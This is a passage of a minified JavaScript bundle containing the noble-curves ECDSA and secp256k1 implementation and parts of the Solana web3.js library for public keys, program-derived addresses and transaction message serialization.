I===En?this:A?A(p,this):this.multiplyUnsafe(e.h)}toRawBytes(I=!0){return os("isCompressed",I),this.assertValidity(),i(p,this,I)}toHex(I=!0){return os("isCompressed",I),ha(this.toRawBytes(I))}}p.BASE=new p(e.Gx,e.Gy,t.ONE),p.ZERO=new p(t.ZERO,t.ONE,t.ZERO);const w=e.nBitLength,x=gb(p,e.endo?Math.ceil(w/2):w);return{CURVE:e,ProjectivePoint:p,normPrivateKeyToScalar:l,weierstrassEquation:o,isWithinCurveOrder:a}}function PD(n){const e=$w(n);return ic(e,{hash:"hash",hmac:"function",randomBytes:"function"},{bits2int:"function",bits2int_modN:"function",lowS:"boolean"}),Object.freeze({lowS:!0,...e})}function LD(n){const e=PD(n),{Fp:t,n:r}=e,i=t.BYTES+1,s=2*t.BYTES+1;function o(d){return Ut(d,r)}function a(d){return B0(d,r)}const{ProjectivePoint:l,normPrivateKeyToScalar:u,weierstrassEquation:h,isWithinCurveOrder:f}=ND({...e,toBytes(d,_,C){const M=_.toAffine(),R=t.toBytes(M.x),j=fa;return os("isCompressed",C),C?j(Uint8Array.from([_.hasEvenY()?2:3]),R):j(Uint8Array.from([4]),R,t.toBytes(M.y))},fromBytes(d){const _=d.length,C=d[0],M=d.subarray(1);if(_===i&&(C===2||C===3)){const R=na(M);if(!Tp(R,En,t.ORDER))throw new Error("Point is not on curve");const j=h(R);let H;try{H=t.sqrt(j)}catch(V){const oe=V instanceof Error?": "+V.message:"";throw new Error("Point is not on curve"+oe)}const D=(H&En)===En;return(C&1)===1!==D&&(H=t.neg(H)),{x:R,y:H}}else if(_===s&&C===4){const R=t.fromBytes(M.subarray(0,t.BYTES)),j=t.fromBytes(M.subarray(t.BYTES,2*t.BYTES));return{x:R,y:j}}else{const R=i,j=s;throw new Error("invalid Point, expected length of "+R+", or uncompressed "+j+", got "+_)}}}),p=d=>ha(Ol(d,e.nByteLength));function w(d){const _=r>>En;return d>_}function x(d){return w(d)?o(-d):d}const k=(d,_,C)=>na(d.slice(_,C));class I{constructor(_,C,M){this.r=_,this.s=C,this.recovery=M,this.assertValidity()}static fromCompact(_){const C=e.nByteLength;return _=un("compactSignature",_,C*2),new I(k(_,0,C),k(_,C,2*C))}static fromDER(_){const{r:C,s:M}=Ki.toSig(un("DER",_));return new I(C,M)}assertValidity(){$r("r",this.r,En,r),$r("s",this.s,En,r)}addRecoveryBit(_){return new I(this.r,this.s,_)}recoverPublicKey(_){const{r:C,s:M,recovery:R}=this,j=q(un("msgHash",_));if(R==null||![0,1,2,3].includes(R))throw new Error("recovery id invalid");const H=R===2||R===3?C+e.n:C;if(H>=t.ORDER)throw new Error("recovery id 2 or 3 invalid");const D=R&1?"03":"02",y=l.fromHex(D+p(H)),V=a(H),oe=o(-j*V),ce=o(M*V),he=l.BASE.multiplyAndAddUnsafe(y,oe,ce);if(!he)throw new Error("point at infinify");return he.assertValidity(),he}hasHighS(){return w(this.s)}normalizeS(){return this.hasHighS()?new I(this.r,o(-this.s),this.recovery):this}toDERRawBytes(){return Dl(this.toDERHex())}toDERHex(){return Ki.hexFromSig({r:this.r,s:this.s})}toCompactRawBytes(){return Dl(this.toCompactHex())}toCompactHex(){return p(this.r)+p(this.s)}}const A={isValidPrivateKey(d){try{return u(d),!0}catch{return!1}},normPrivateKeyToScalar:u,randomPrivateKey:()=>{const d=fb(e.n);return F4(e.randomBytes(d),e.n)},precompute(d=8,_=l.BASE){return _._setWindowSize(d),_.multiply(BigInt(3)),_}};function b(d,_=!0){return l.fromPrivateKey(d).toRawBytes(_)}function E(d){const _=ua(d),C=typeof d=="string",M=(_||C)&&d.length;return _?M===i||M===s:C?M===2*i||M===2*s:d instanceof l}function O(d,_,C=!0){if(E(d))throw new Error("first arg must be private key");if(!E(_))throw new Error("second arg must be public key");return l.fromHex(_).multiply(u(d)).toRawBytes(C)}const W=e.bits2int||function(d){if(d.length>8192)throw new Error("input is too large");const _=na(d),C=d.length*8-e.nBitLength;return C>0?_>>BigInt(C):_},q=e.bits2int_modN||function(d){return o(W(d))},L=Ww(e.nBitLength);function N(d){return $r("num < 2^"+e.nBitLength,d,Qi,L),Ol(d,e.nByteLength)}function B(d,_,C=z){if(["recovered","canonical"].some(Ae=>Ae in C))throw new Error("sign() legacy options not supported");const{hash:M,randomBytes:R}=e;let{lowS:j,prehash:H,extraEntropy:D}=C;j==null&&(j=!0),d=un("msgHash",d),_E(C),H&&(d=un("prehashed msgHash",M(d)));const y=q(d),V=u(_),oe=[N(V),N(y)];if(D!=null&&D!==!1){const Ae=D===!0?R(t.BYTES):D;oe.push(un("extraEntropy",Ae))}const ce=fa(...oe),he=y;function Ce(Ae){const Pe=W(Ae);if(!f(Pe))return;const gt=a(Pe),je=l.BASE.multiply(Pe).toAffine(),Ue=o(je.x);if(Ue===Qi)return;const Pt=o(gt*o(he+Ue*V));if(Pt===Qi)return;let We=(je.x===Ue?0:2)|Number(je.y&En),Ke=Pt;return j&&w(Pt)&&(Ke=x(Pt),We^=1),new I(Ue,Ke,We)}return{seed:ce,k2sig:Ce}}const z={lowS:e.lowS,prehash:!1},$={lowS:e.lowS,prehash:!1};function K(d,_,C=z){const{seed:M,k2sig:R}=B(d,_,C),j=e;return cb(j.hash.outputLen,j.nByteLength,j.hmac)(M,R)}l.BASE._setWindowSize(8);function S(d,_,C,M=$){var We;const R=d;_=un("msgHash",_),C=un("publicKey",C);const{lowS:j,prehash:H,format:D}=M;if(_E(M),"strict"in M)throw new Error("options.strict was renamed to lowS");if(D!==void 0&&D!=="compact"&&D!=="der")throw new Error("format must be compact or der");const y=typeof R=="string"||ua(R),V=!y&&!D&&typeof R=="object"&&R!==null&&typeof R.r=="bigint"&&typeof R.s=="bigint";if(!y&&!V)throw new Error("invalid signature, expected Uint8Array, hex string or Signature instance");let oe,ce;try{if(V&&(oe=new I(R.r,R.s)),y){try{D!=="compact"&&(oe=I.fromDER(R))}catch(Ke){if(!(Ke instanceof Ki.Err))throw Ke}!oe&&D!=="der"&&(oe=I.fromCompact(R))}ce=l.fromHex(C)}catch{return!1}if(!oe||j&&oe.hasHighS())return!1;H&&(_=e.hash(_));const{r:he,s:Ce}=oe,Ae=q(_),Pe=a(Ce),gt=o(Ae*Pe),je=o(he*Pe),Ue=(We=l.BASE.multiplyAndAddUnsafe(ce,gt,je))==null?void 0:We.toAffine();return Ue?o(Ue.x)===he:!1}return{CURVE:e,getPublicKey:b,getSharedSecret:O,sign:K,verify:S,ProjectivePoint:l,Signature:I,utils:A}}/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */function DD(n){return{hash:n,hmac:(e,...t)=>ex(n,e,qP(...t)),randomBytes:sb}}function OD(n,e){const t=r=>LD({...n,...DD(r)});return{...t(e),create:t}}/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */const tx=BigInt("0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f"),IE=BigInt("0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141"),BD=BigInt(1),F0=BigInt(2),SE=(n,e)=>(n+e/F0)/e;function UD(n){const e=tx,t=BigInt(3),r=BigInt(6),i=BigInt(11),s=BigInt(22),o=BigInt(23),a=BigInt(44),l=BigInt(88),u=n*n*n%e,h=u*u*n%e,f=Xt(h,t,e)*h%e,p=Xt(f,t,e)*h%e,w=Xt(p,F0,e)*u%e,x=Xt(w,i,e)*w%e,k=Xt(x,s,e)*x%e,I=Xt(k,a,e)*k%e,A=Xt(I,l,e)*I%e,b=Xt(A,a,e)*k%e,E=Xt(b,t,e)*h%e,O=Xt(E,o,e)*x%e,W=Xt(O,r,e)*u%e,q=Xt(W,F0,e);if(!z0.eql(z0.sqr(q),n))throw new Error("Cannot find square root");return q}const z0=Ap(tx,void 0,void 0,{sqrt:UD}),jD=OD({a:BigInt(0),b:BigInt(7),Fp:z0,n:IE,Gx:BigInt("55066263022277343669578718895168534326250603453777594175500187360389116729240"),Gy:BigInt("32670510020758816978083085130507043184471273380659243275938904335757337482424"),h:BigInt(1),lowS:!0,endo:{beta:BigInt("0x7ae96a2b657c07106e64479eac3434e99cf0497512f58995c1396c28719501ee"),splitScalar:n=>{const e=IE,t=BigInt("0x3086d221a7d46bcde86c90e49284eb15"),r=-BD*BigInt("0xe4437ed6010e88286f547fa90abfe4c3"),i=BigInt("0x114ca50f7a8e2f3f657c1108d9d44cfd8"),s=t,o=BigInt("0x100000000000000000000000000000000"),a=SE(s*n,e),l=SE(-r*n,e);let u=Ut(n-a*t-l*i,e),h=Ut(-a*r-l*s,e);const f=u>o,p=h>o;if(f&&(u=e-u),p&&(h=e-h),u>o||h>o)throw new Error("splitScalar: Endomorphism failed, k="+n);return{k1neg:f,k1:u,k2neg:p,k2:h}}}},j0);BigInt(0);bp.utils.randomPrivateKey;function TE(n){try{return bp.ExtendedPoint.fromHex(n),!0}catch{return!1}}const nx=(n,e)=>bp.sign(n,e.slice(0,32)),VD=bp.verify,Pn=n=>ve.Buffer.isBuffer(n)?n:n instanceof Uint8Array?ve.Buffer.from(n.buffer,n.byteOffset,n.byteLength):ve.Buffer.from(n);class FD{constructor(e){Object.assign(this,e)}encode(){return ve.Buffer.from(Ab(Nf,this))}static decode(e){return bb(Nf,this,e)}static decodeUnchecked(e){return _b(Nf,this,e)}}const Nf=new Map;var rx;const zD=32,io=32;function WD(n){return n._bn!==void 0}let AE=1;class Se extends FD{constructor(e){if(super({}),this._bn=void 0,WD(e))this._bn=e._bn;else{if(typeof e=="string"){const t=Bn.decode(e);if(t.length!=io)throw new Error("Invalid public key input");this._bn=new yE(t)}else this._bn=new yE(e);if(this._bn.byteLength()>io)throw new Error("Invalid public key input")}}static unique(){const e=new Se(AE);return AE+=1,new Se(e.toBuffer())}equals(e){return this._bn.eq(e._bn)}toBase58(){return Bn.encode(this.toBytes())}toJSON(){return this.toBase58()}toBytes(){const e=this.toBuffer();return new Uint8Array(e.buffer,e.byteOffset,e.byteLength)}toBuffer(){const e=this._bn.toArrayLike(ve.Buffer);if(e.length===io)return e;const t=ve.Buffer.alloc(32);return e.copy(t,32-e.length),t}get[Symbol.toStringTag](){return`PublicKey(${this.toString()})`}toString(){return this.toBase58()}static async createWithSeed(e,t,r){const i=ve.Buffer.concat([e.toBuffer(),ve.Buffer.from(t),r.toBuffer()]),s=j0(i);return new Se(s)}static createProgramAddressSync(e,t){let r=ve.Buffer.alloc(0);e.forEach(function(s){if(s.length>zD)throw new TypeError("Max seed length exceeded");r=ve.Buffer.concat([r,Pn(s)])}),r=ve.Buffer.concat([r,t.toBuffer(),ve.Buffer.from("ProgramDerivedAddress")]);const i=j0(r);if(TE(i))throw new Error("Invalid seeds, address must fall off the curve");return new Se(i)}static async createProgramAddress(e,t){return this.createProgramAddressSync(e,t)}static findProgramAddressSync(e,t){let r=255,i;for(;r!=0;){try{const s=e.concat(ve.Buffer.from([r]));i=this.createProgramAddressSync(s,t)}catch(s){if(s instanceof TypeError)throw s;r--;continue}return[i,r]}throw new Error("Unable to find a viable program address nonce")}static async findProgramAddress(e,t){return this.findProgramAddressSync(e,t)}static isOnCurve(e){const t=new Se(e);return TE(t.toBytes())}}rx=Se;Se.default=new rx("11111111111111111111111111111111");Nf.set(Se,{kind:"struct",fields:[["_bn","u256"]]});new Se("BPFLoader1111111111111111111111111111111111");const El=1280-40-8,sv=127,Fu=64;class ix extends Error{constructor(e){super(`Signature ${e} has expired: block height exceeded.`),this.signature=void 0,this.signature=e}}Object.defineProperty(ix.prototype,"name",{value:"TransactionExpiredBlockheightExceededError"});class sx extends Error{constructor(e,t){super(`Transaction was not confirmed in ${t.toFixed(2)} seconds. It is unknown if it succeeded or failed. Check signature ${e} using the Solana Explorer or CLI tools.`),this.signature=void 0,this.signature=e}}Object.defineProperty(sx.prototype,"name",{value:"TransactionExpiredTimeoutError"});class Kc extends Error{constructor(e){super(`Signature ${e} has expired: the nonce is no longer valid.`),this.signature=void 0,this.signature=e}}Object.defineProperty(Kc.prototype,"name",{value:"TransactionExpiredNonceInvalidError"});class kd{constructor(e,t){this.staticAccountKeys=void 0,this.accountKeysFromLookups=void 0,this.staticAccountKeys=e,this.accountKeysFromLookups=t}keySegments(){const e=[this.staticAccountKeys];return this.accountKeysFromLookups&&(e.push(this.accountKeysFromLookups.writable),e.push(this.accountKeysFromLookups.readonly)),e}get(e){for(const t of this.keySegments()){if(e<t.length)return t[e];e-=t.length}}get length(){return this.keySegments().flat().length}compileInstructions(e){if(this.length>255+1)throw new Error("Account index overflow encountered during compilation");const r=new Map;this.keySegments().flat().forEach((s,o)=>{r.set(s.toBase58(),o)});const i=s=>{const o=r.get(s.toBase58());if(o===void 0)throw new Error("Encountered an unknown instruction account key during compilation");return o};return e.map(s=>({programIdIndex:i(s.programId),accountKeyIndexes:s.keys.map(o=>i(o.pubkey)),data:s.data}))}}const He=(n="publicKey")=>Rt(32,n),$D=(n="signature")=>Rt(64,n),ul=(n="string")=>{const e=_e([be("length"),be("lengthPadding"),Rt(ra(be(),-8),"chars")],n),t=e.decode.bind(e),r=e.encode.bind(e),i=e;return i.decode=(s,o)=>t(s,o).chars.toString(),i.encode=(s,o,a)=>{const l={chars:ve.Buffer.from(s,"utf8")};return r(l,o,a)},i.alloc=s=>be().span+be().span+ve.Buffer.from(s,"utf8").length,i},HD=(n="authorized")=>_e([He("staker"),He("withdrawer")],n),qD=(n="lockup")=>_e([Ar("unixTimestamp"),Ar("epoch"),He("custodian")],n),KD=(n="voteInit")=>_e([He("nodePubkey"),He("authorizedVoter"),He("authorizedWithdrawer"),it("commission")],n),GD=(n="voteAuthorizeWithSeedArgs")=>_e([be("voteAuthorizationType"),He("currentAuthorityDerivedKeyOwnerPubkey"),ul("currentAuthorityDerivedKeySeed"),He("newAuthorized")],n);function ox(n,e){const t=i=>{if(i.span>=0)return i.span;if(typeof i.alloc=="function")return i.alloc(e[i.property]);if("count"in i&&"elementLayout"in i){const s=e[i.property];if(Array.isArray(s))return s.length*t(i.elementLayout)}else if("fields"in i)return ox({layout:i},e[i.property]);return 0};let r=0;return n.layout.fields.forEach(i=>{r+=t(i)}),r}function br(n){let e=0,t=0;for(;;){let r=n.shift();if(e|=(r&127)<<t*7,t+=1,!(r&128))break}return e}function xr(n,e){let t=e;for(;;){let r=t&127;if(t>>=7,t==0){n.push(r);break}else r|=128,n.push(r)}}function Bt(n,e){if(!n)throw new Error(e||"Assertion failed")}class Pp{constructor(e,t){this.payer=void 0,this.keyMetaMap=void 0,this.payer=e,this.keyMetaMap=t}static compile(e,t){const r=new Map,i=o=>{const a=o.toBase58();let l=r.get(a);return l===void 0&&(l={isSigner:!1,isWritable:!1,isInvoked:!1},r.set(a,l)),l},s=i(t);s.isSigner=!0,s.isWritable=!0;for(const o of e){i(o.programId).isInvoked=!0;for(const a of o.keys){const l=i(a.pubkey);l.isSigner||(l.isSigner=a.isSigner),l.isWritable||(l.isWritable=a.isWritable)}}return new Pp(t,r)}getMessageComponents(){const e=[...this.keyMetaMap.entries()];Bt(e.length<=256,"Max static account keys length exceeded");const t=e.filter(([,l])=>l.isSigner&&l.isWritable),r=e.filter(([,l])=>l.isSigner&&!l.isWritable),i=e.filter(([,l])=>!l.isSigner&&l.isWritable),s=e.filter(([,l])=>!l.isSigner&&!l.isWritable),o={numRequiredSignatures:t.length+r.length,numReadonlySignedAccounts:r.length,numReadonlyUnsignedAccounts:s.length};{Bt(t.length>0,"Expected at least one writable signer key");const[l]=t[0];Bt(l===this.payer.toBase58(),"Expected first writable signer key to be the fee payer")}const a=[...t.map(([l])=>new Se(l)),...r.map(([l])=>new Se(l)),...i.map(([l])=>new Se(l)),...s.map(([l])=>new Se(l))];return[o,a]}extractTableLookup(e){const[t,r]=this.drainKeysFoundInLookupTable(e.state.addresses,o=>!o.isSigner&&!o.isInvoked&&o.isWritable),[i,s]=this.drainKeysFoundInLookupTable(e.state.addresses,o=>!o.isSigner&&!o.isInvoked&&!o.isWritable);if(!(t.length===0&&i.length===0))return[{accountKey:e.key,writableIndexes:t,readonlyIndexes:i},{writable:r,readonly:s}]}drainKeysFoundInLookupTable(e,t){const r=new Array,i=new Array;for(const[s,o]of this.keyMetaMap.entries())if(t(o)){const a=new Se(s),l=e.findIndex(u=>u.equals(a));l>=0&&(Bt(l<256,"Max lookup table index exceeded"),r.push(l),i.push(a),this.keyMetaMap.delete(s))}return[r,i]}}const ax="Reached end of buffer unexpectedly";function Yi(n){if(n.length===0)throw new Error(ax);return n.shift()}function kr(n,...e){const[t]=e;if(e.length===2?t+(e[1]??0)>n.length:t>=n.length)throw new Error(ax);return n.splice(...e)}class fs{constructor(e){this.header=void 0,this.accountKeys=void 0,this.recentBlockhash=void 0,this.instructions=void 0,this.indexToProgramIds=new Map,this.header=e.header,this.accountKeys=e.accountKeys.map(t=>new Se(t)),this.recentBlockhash=e.recentBlockhash,this.instructions=e.instructions,this.instructions.forEach(t=>this.indexToProgramIds.set(t.programIdIndex,this.accountKeys[t.programIdIndex]))}get version(){return"legacy"}get staticAccountKeys(){return this.accountKeys}get compiledInstructions(){return this.instructions.map(e=>({programIdIndex:e.programIdIndex,accountKeyIndexes:e.accounts,data:Bn.decode(e.data)}))}get addressTableLookups(){return[]}getAccountKeys(){return new kd(this.staticAccountKeys)}static compile(e){const t=Pp.compile(e.instructions,e.payerKey),[r,i]=t.getMessageComponents(),o=new kd(i).compileInstructions(e.instructions).map(a=>({programIdIndex:a.programIdIndex,accounts:a.accountKeyIndexes,data:Bn.encode(a.data)}));return new fs({header:r,accountKeys:i,recentBlockhash:e.recentBlockhash,instructions:o})}isAccountSigner(e){return e<this.header.numRequiredSignatures}isAccountWritable(e){const t=this.header.numRequiredSignatures;if(e>=this.header.numRequiredSignatures){const r=e-t,s=this.accountKeys.length-t-this.header.numReadonlyUnsignedAccounts;return r<s}else{const r=t-this.header.numReadonlySignedAccounts;return e<r}}isProgramId(e){return this.indexToProgramIds.has(e)}programIds(){return[...this.indexToProgramIds.values()]}nonProgramIds(){return this.accountKeys.filter((e,t)=>!this.isProgramId(t))}serialize(){const e=this.accountKeys.length;let t=[];xr(t,e);const r=this.instructions.map(f=>{const{accounts:p,programIdIndex:w}=f,x=Array.from(Bn.decode(f.data));let k=[];xr(k,p.length);let I=[];return xr(I,x.length),{programIdIndex:w,keyIndicesCount:ve.Buffer.from(k),keyIndices:p,dataLength:ve.Buffer.from(I),data:x}});let i=[];xr(i,r.length);let s=ve.Buffer.alloc(El);ve.Buffer.from(i).copy(s);let o=i.length;r.forEach(f=>{const w=_e([it("programIdIndex"),Rt(f.keyIndicesCount.length,"keyIndicesCount"),tr(it("keyIndex"),f.keyIndices.length,"keyIndices"),Rt(f.dataLength.length,"dataLength"),tr(it("userdatum"),f.data.length,"data")]).encode(f,s,o);o+=w}),s=s.slice(0,o);const a=_e([Rt(1,"numRequiredSignatures"),Rt(1,"numReadonlySignedAccounts"),Rt(1,"numReadonlyUnsignedAccounts"),Rt(t.length,"keyCount"),tr(He("key"),e,"keys"),He("recentBlockhash")]),l={numRequiredSignatures:ve.Buffer.from([this.header.numRequiredSignatures]),numReadonlySignedAccounts:ve.Buffer.from([this.header.numReadonlySignedAccounts]),numReadonlyUnsignedAccounts:ve.Buffer.from([this.header.numReadonlyUnsignedAccounts]),keyCount:ve.Buffer.from(t),keys:this.accountKeys.map(f=>Pn(f.toBytes())),recentBlockhash:Bn.decode(this.recentBlockhash)};let u=ve.Buffer.alloc(2048);const h=a.encode(l,u);return s.copy(u,h),u.slice(0,h+s.length)}static from(e){let t=[...e];const r=Yi(t);if(r!==(r&sv))throw new Error("Versioned messages must be deserialized with VersionedMessage.deserialize()");const i=Yi(t),s=Yi(t),o=br(t);let a=[];for(let p=0;p<o;p++){const w=kr(t,0,io);a.push(new Se(ve.Buffer.from(w)))}const l=kr(t,0,io),u=br(t);let h=[];for(let p=0;p<u;p++){const w=Yi(t),x=br(t),k=kr(t,0,x),I=br(t),A=kr(t,0,I),b=Bn.encode(ve.Buffer.from(A));h.push({programIdIndex:w,accounts:k,data:b})}const f={header:{numRequiredSignatures:r,numReadonlySignedAccounts:i,numReadonlyUnsignedAccounts:s},recentBlockhash:Bn.encode(ve.Buffer.from(l)),accountKeys:a,instructions:h};return new fs(f)}}class zu{constructor(e){this.header=void 0,this.staticAccountKeys=void 0,this.recentBlockhash=void 0,this.compiledInstructions=void 0,this.addressTableLookups=void 0,this.header=e.header,this.staticAccountKeys=e.staticAccountKeys,this.recentBlockhash=e.recentBlockhash,this.compiledInstructions=e.compiledInstructions,this.addressTableLookups=e.addressTableLookups}get version(){return 0}get numAccountKeysFromLookups(){let e=0;for(const t of this.addressTableLookups)e+=t.readonlyIndexes.length+t.writableIndexes.length;return e}getAccountKeys(e){let t;if(e&&"accountKeysFromLookups"in e&&e.accountKeysFromLookups){if(this.numAccountKeysFromLookups!=e.accountKeysFromLookups.writable.length+e.accountKeysFromLookups.readonly.length)throw new Error("Failed to get account keys because of a mismatch in the number of account keys from lookups");t=e.accountKeysFromLookups}else if(e&&"addressLookupTableAccounts"in e&&e.addressLookupTableAccounts)t=this.resolveAddressTableLookups(e.addressLookupTableAccounts);else if(this.addressTableLookups.length>0)throw new Error("Failed to get account keys because address table lookups were not resolved");return new kd(this.staticAccountKeys,t)}isAccountSigner(e){return e<this.header.numRequiredSignatures}isAccountWritable(e){const t=this.header.numRequiredSignatures,r=this.staticAccountKeys.length;if(e>=r){const i=e-r,s=this.addressTableLookups.reduce((o,a)=>o+a.writableIndexes.length,0);return i<s}else if(e>=this.header.numRequiredSignatures){const i=e-t,o=r-t-this.header.numReadonlyUnsignedAccounts;return i<o}else{const i=t-this.header.numReadonlySignedAccounts;return e<i}}resolveAddressTableLookups(e){const t={writable:[],readonly:[]};for(const r of this.addressTableLookups){const i=e.find(s=>s.key.equals(r.accountKey));if(!i)throw new Error(`Failed to find address lookup table account for table key ${r.accountKey.toBase58()}`);for(const s of r.writableIndexes)if(s<i.state.addresses.length)t.writable.push(i.state.addresses[s]);else throw new Error(`Failed to find address for index ${s} in address lookup table ${r.accountKey.toBase58()}`);for(const s of r.readonlyIndexes)if(s<i.state.addresses.length)t.readonly.push(i.state.addresses[s]);else throw new Error(`Failed to find address for index ${s} in address lookup table ${r.accountKey.toBase58()}`)}return t}static compile(e){const t=Pp.compile(e.instructions,e.payerKey),r=new Array,i={writable:new Array,readonly:new Array},s=e.addressLookupTableAccounts||[];for(const h of s){const f=t.extractTableLookup(h);if(f!==void 0){const[p,{writable:w,readonly:x}]=f;r.push(p),i.writable.push(...w),i.readonly.push(...x)}}const[o,a]=t.getMessageComponents(),u=new kd(a,i).compileInstructions(e.instructions);return new zu({header:o,staticAccountKeys:a,recentBlockhash:e.recentBlockhash,compiledInstructions:u,addressTableLookups:r})}serialize(){const e=Array();xr(e,this.staticAccountKeys.length);const t=this.serializeInstructions(),r=Array();xr(r,this.compiledInstructions.length);const i=this.serializeAddressTableLookups(),s=Array();xr(s,this.addressTableLookups.length);const o=_e([it("prefix"),_e([it("numRequiredSignatures"),it("numReadonlySignedAccounts"),it("numReadonlyUnsignedAccounts")],"header"),Rt(e.length,"staticAccountKeysLength"),tr(He(),this.staticAccountKeys.length,"staticAccountKeys"),He("recentBlockhash"),Rt(r.length,"instructionsLength"),Rt(t.length,"serializedInstructions"),Rt(s.length,"addressTableLookupsLength"),Rt(i.length,"serializedAddressTableLookups")]),a=new Uint8Array(El),l=128,u=o.encode({prefix:l,header:this.header,staticAccountKeysLength:new Uint8Array(e),staticAccountKeys:this.staticAccountKeys.map(h=>h.toBytes()),recentBlockhash:Bn.decode(this.recentBlockhash),instructionsLength:new Uint8Array(r),serializedInstructions:t,addressTableLookupsLength:new Uint8Array(s),serializedAddressTableLookups:i},a);return a.slice(0,u)}serializeInstructions(){let e=0;const t=new Uint8Array(El);for(const r of this.compiledInstructions){const i=Array();xr(i,r.accountKeyIndexes.length);const s=Array();xr(s,r.data.length);const o=_e([it("programIdIndex"),Rt(i.length,"encodedAccountKeyIndexesLength"),tr(it(),r.accountKeyIndexes.length,"accountKeyIndexes"),Rt(s.length,"encodedDataLength"),Rt(r.data.length,"data")]);e+=o.encode({programIdIndex:r.programIdIndex,encodedAccountKeyIndexesLength:new Uint8Array(i),accountKeyIndexes:r.accountKeyIndexes,encodedDataLength:new Uint8Array(s),data:r.data},t,e)}return t.slice(0,e)}serializeAddressTableLookups(){let e=0;const t=new Uint8Array(El);for(const r of this.addressTableLookups){const i=Array();xr(i,r.writableIndexes.length);const s=Array();xr(s,r.readonlyIndexes.length);const o=_e([He("accountKey"),Rt(i.length,"encodedWritableIndexesLength"),tr(it(),r.writableIndexes.length,"writableIndexes"),Rt(s.length,"encodedReadonlyIndexesLength"),tr(it(),r.readonlyIndexes.length,"readonlyIndexes")]);e+=o.encode({accountKey:r.accountKey.toBytes(),encodedWritableIndexesLength:new Uint8Array(i),writableIndexes:r.writableIndexes,encodedReadonlyIndexesLength:new Uint8Array(s),readonlyIndexes:r.readonlyIndexes},t,e)}return t.slice(0,e)}static deserialize(e){let t=[...e];const r=Yi(t),i=r&sv;Bt(r!==i,"Expected versioned message but received legacy message");const s=i;Bt(s===0,`Expected versioned message with version 0 but found version ${s}`);const o={numRequiredSignatures:Yi(t),numReadonlySignedAccounts:Yi(t),numReadonlyUnsignedAccounts:Yi(t)},a=[],l=br(t);for(let x=0;x<l;x++)a.push(new Se(kr(t,0,io)));const u=Bn.encode(kr(t,0,io)),h=br(t),f=[];for(let x=0;x<h;x++){const k=Yi(t),I=br(t),A=kr(t,0,I),b=br(t),E=new Uint8Array(kr(t,0,b));f.push({programIdIndex:k,accountKeyIndexes:A,data:E})}const p=br(t),w=[];for(let x=0;x<p;x++){const k=new Se(kr(t,0,io)),I=br(t),A=kr(t,0,I),b=br(t),E=kr(t,0,b);w.push({accountKey:k,writableIndexes:A,readonlyIndexes:E})}return new zu({header:o,staticAccountKeys:a,recentBlockhash:u,compiledInstructions:f,addressTableLookups:w})}}const ov={deserializeMessageVersion(n){const e=n[0],t=e&sv;return t===e?"legacy":t},deserialize:n=>{const e=ov.deserializeMessageVersion(n);if(e==="legacy")return fs.from(n);if(e===0)return zu.deserialize(n);throw new Error(`Transaction message version ${e} deserialization is not supported`)}};let Ms=function(n){return n[n.BLOCKHEIGHT_EXCEEDED=0]="BLOCKHEIGHT_EXCEEDED",n[n.PROCESSED=1]="PROCESSED",n[n.TIMED_OUT=2]="TIMED_OUT",n[n.NONCE_INVALID=3]="NONCE_INVALID",n}({});const QD=ve.Buffer.alloc(Fu).fill(0);class ti{constructor(e){this.keys=void 0,this.programId=void 0,this.data=ve.Buffer.alloc(0),this.programId=e.programId,this.keys=e.keys,e.data&&(this.data=e.data)}toJSON(){return{keys:this.keys.map(({pubkey:e,isSigner:t,isWritable:r})=>({pubkey:e.toJSON(),isSigner:t,isWritable:r})),programId:this.programId.toJSON(),data:[...this.data]}}}class mr{get signature(){return this.signatures.length>0?this.signatures[0].signature:null}constructor(e){if(this.signatures=[],this.feePayer=void 0,this.instructions=[],this.recentBlockhash=void 0,this.lastValidBlockHeight=void 0,this.nonceInfo=void 0,this.minNonceContextSlot=void 0,this._message=void 0,this._json=void 0,!!e)if(e.feePayer&&(this.feePayer=e.feePayer),e.signatures&&(this.signatures=e.signatures),Object.prototype.hasOwnProperty.call(e,"nonceInfo")){const{minContextSlot:t,nonceInfo:r}=e;this.minNonceContextSlot=t,this.nonceInfo=r}else if(Object.prototype.hasOwnProperty.call(e,"lastValidBlockHeight")){const{blockhash:t,lastValidBlockHeight:r}=e;this.recentBlockhash=t,this.lastValidBlockHeight=r}else{const{recentBlockhash:t,nonceInfo:r}=e;r&&(this.nonceInfo=r),this.recentBlockhash=t}}toJSON(){return{recentBlockhash:this.recentBlockhash||null,feePayer:this.feePayer?this.feePayer.toJSON():null,nonceInfo:this.nonceInfo?{nonce:this.nonceInfo.nonce,nonceInstruction:this.nonceInfo.nonceInstruction.toJSON()}:null,instructions:this.instructions.map(e=>e.toJSON()),signers:this.signatures.map(({publicKey:e})=>e.toJSON())}}add(...e){if(e.length===0)throw new Error("No instructions");return e.forEach(t=>{"instructions"in t?this.instructions=this.instructions.concat(t.instructions):"data"in t&&"programId"in t&&"keys"in t?this.instructions.push(t):this.instructions.push(new ti(t))}),this}compileMessage(){if(this._message&&JSON.stringify(this.toJSON())===JSON.stringify(this._json))return this._message;let e,t;if(this.nonceInfo?(e=this.nonceInfo.nonce,this.instructions[0]!=this.nonceInfo.nonceInstruction?t=[this.nonceInfo.nonceInstruction,...this.instructions]:t=this.instructions):(e=this.recentBlockhash,t=this.instructions),!e)throw new Error("Transaction recentBlockhash required");t.length<1&&console.warn("No instructions provided");let r;if(this.feePayer)r=this.feePayer;else if(this.signatures.length>0&&this.signatures[0].publicKey)r=this.signatures[0].publicKey;else throw new Error("Transaction fee payer required");for(let k=0;k<t.length;k++)if(t[k].programId===void 0)throw new Error(`Transaction instruction index ${k} has undefined program id`);const i=[],s=[];t.forEach(k=>{k.keys.forEach(A=>{s.push({...A})});const I=k.programId.toString();i.includes(I)||i.push(I)}),i.forEach(k=>{s.push({pubkey:new Se(k),isSigner:!1,isWritable:!1})});const o=[];s.forEach(k=>{const I=k.pubkey.toString(),A=o.findIndex(b=>b.pubkey.toString()===I);A>-1?(o[A].isWritable=o[A].isWritable||k.isWritable,o[A].isSigner=o[A].isSigner||k.isSigner):o.push(k)}),o.sort(function(k,I){if(k.isSigner!==I.isSigner)return k.isSigner?-1:1;if(k.isWritable!==I.isWritable)return k.isWritable?-1:1;const A={localeMatcher:"best fit",usage:"sort",sensitivity:"variant",ignorePunctuation:!1,numeric:!1,caseFirst:"lower"};return 